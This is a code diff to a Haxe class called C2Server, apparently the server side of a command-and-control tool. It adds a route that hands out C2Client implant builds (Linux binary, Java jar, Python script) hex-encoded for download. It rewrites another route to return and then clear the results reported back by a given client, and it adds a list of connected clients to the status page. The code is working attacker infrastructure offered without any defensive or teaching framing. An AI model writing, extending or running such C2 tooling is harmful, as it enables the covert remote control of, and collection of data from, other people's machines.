@@ -21,10 +21,10 @@ class C2Server {
                 return Future.sync((C2Server.asdfPath(req):OutgoingResponse));
             } else if (req.header.url.path == "/qwerty") {
                 return Future.sync((C2Server.qwertyPath(req):OutgoingResponse));
-            } else if (req.header.url.path == "/zxcv") {
-                return Future.sync((C2Server.zxcvPath(req):OutgoingResponse));
             } else if (req.header.url.path == "/comstar") {
                 return Future.sync((C2Server.comstarPath(req):OutgoingResponse));
+            } else if (req.header.url.path == "/wat") {
+                return Future.sync((C2Server.watPath(req):OutgoingResponse));
             } else {
                 return Future.sync(('Hello, World!':OutgoingResponse));
             }
@@ -35,7 +35,10 @@ class C2Server {
         return 'status:
     code_tables: ${C2Server.codes_tables}
     command_tables: ${C2Server.command_tables}
-    return_tables: ${C2Server.return_tables}\n';
+    return_tables: ${C2Server.return_tables}
+
+connected clients:
+    ${[ for (k in C2Server.codes_tables.keys()) k ].join("\n    ")}\n';
     }
 
     static function asdfPath(req) {
@@ -95,13 +98,34 @@ class C2Server {
 
     static function qwertyPath(req) {
         var url:Url = req.header.url;
-        var query = url.query;
-        if (query != null) {
-            var nquery:Query = query;
-            var values = nquery.toMap();
-            Sys.println("thing: " + values['key']);
+        var q = url.query.toMap();
+        var id = q['id'];
+
+        if (!C2Server.codes_tables.exists(id)) {
+            return 'id doesnt exist';
         }
-        return 'qwerty:';
+
+        var code = C2Server.codes_tables[id];
+        var rets = C2Server.return_tables[code].join("\n---\n");
+        C2Server.return_tables[code] = [];
+
+        return '${rets}';
+    }
+
+    static function watPath(req) {
+        var url:Url = req.header.url;
+        var q = url.query.toMap();
+        var type = q['type'];
+
+        if (type == "cpp") {
+            return sys.io.File.getBytes('bin/C2Client.linux.x86_64/C2Client').toHex();
+        } else if (type == "java") {
+            return sys.io.File.getBytes('bin/C2Client/C2Client.jar').toHex();
+        } else if (type == "python") {
+            return sys.io.File.getBytes('bin/C2Client.py').toHex();
+        } else {
+            return 'wat';
+        }
     }
 }
 
